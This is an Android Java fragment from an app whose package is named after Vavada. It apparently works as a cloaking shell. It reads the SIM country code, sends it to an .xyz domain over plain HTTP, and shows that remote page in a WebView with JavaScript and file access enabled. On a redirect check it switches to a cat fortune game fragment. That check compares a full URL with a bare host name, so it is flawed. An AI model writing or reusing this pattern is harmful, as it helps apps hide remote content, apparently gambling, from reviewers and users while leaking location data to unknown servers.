package com.vavada.aso26.ui.fragment;

import static android.app.Activity.RESULT_OK;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.view.KeyEvent;
import android.view.LayoutInflater;
import android.view.MotionEvent;
import android.view.View;
import android.view.ViewGroup;
import android.webkit.CookieManager;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import androidx.annotation.NonNull;
import androidx.fragment.app.Fragment;

import com.vavada.aso26.databinding.FragmentCatsBinding;


public class CatsFragment extends Fragment {

    public CatsFragment() {
        // Required empty public constructor
    }


    private final static int FILECHOOSER_RESULTCODE = 1;
    private ValueCallback<Uri[]> mUploadMessage;
FragmentCatsBinding binding;
    private class MyWebChromeClient extends WebChromeClient {

        // maneja la accion de seleccionar archivos
        @Override
        public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> filePathCallback, FileChooserParams fileChooserParams) {

            // asegurar que no existan callbacks
            if (mUploadMessage != null) {
                mUploadMessage.onReceiveValue(null);
            }

            mUploadMessage = filePathCallback;

            Intent i = new Intent(Intent.ACTION_GET_CONTENT);
            i.addCategory(Intent.CATEGORY_OPENABLE);
            i.setType("*/*"); // set MIME type to filter

            startActivityForResult(Intent.createChooser(i, "File Chooser"), FILECHOOSER_RESULTCODE );

            return true;
        }
    }
    @Override
    public void onActivityResult(int requestCode, int resultCode, Intent intent) {

        // manejo de seleccion de archivo
        if (requestCode == FILECHOOSER_RESULTCODE) {

            if (null == mUploadMessage || intent == null || resultCode != RESULT_OK) {
                return;
            }

            Uri[] result = null;
            String dataString = intent.getDataString();

            if (dataString != null) {
                result = new Uri[]{ Uri.parse(dataString) };
            }

            mUploadMessage.onReceiveValue(result);
            mUploadMessage = null;
        }
    }
    @SuppressLint("SetJavaScriptEnabled")
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, ViewGroup container,
                             Bundle savedInstanceState) {
        binding = FragmentCatsBinding.inflate(inflater, container, false);
        View view = binding.getRoot();
        TelephonyManager timesi = (TelephonyManager)requireActivity().getSystemService(Context.TELEPHONY_SERVICE);
        String sim = timesi.getNetworkCountryIso();
        binding.right.getSettings().setJavaScriptEnabled(true);
        CookieManager.getInstance().setAcceptThirdPartyCookies(binding.right, true);
        binding.right.getSettings().setAllowFileAccess(true);
        binding.right.getSettings().setSupportMultipleWindows(true);
        binding.right.getSettings().setDomStorageEnabled(true);
        binding.right.canGoBack();
        binding.right.setOnKeyListener((v, keyCode, event) -> {
            if (keyCode == KeyEvent.KEYCODE_BACK
                    && event.getAction() == MotionEvent.ACTION_UP
                    && binding.right.canGoBack()) {
                binding.right.goBack();
                return true;
            }
            return false;
        });

        binding.right.loadUrl("http://bigfunstar.xyz/PDrG9Y?pistol="+sim);
        binding.right.setWebChromeClient(new MyWebChromeClient());
        binding.right.setWebViewClient(new WebViewClient(){

            @Override
            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                view.loadUrl(request.getUrl().toString());
                return true;
            }


            @Override
            public void onPageFinished(WebView view, String url) {
                if(url.equals(Uri.parse("http://broser.xyz/9qd9zf").getHost())){
                    getParentFragmentManager().beginTransaction().replace(android.R.id.content, new LuckyFortuneCatFragment()).commit();
                }

            }}
        );
        return view;
    }
}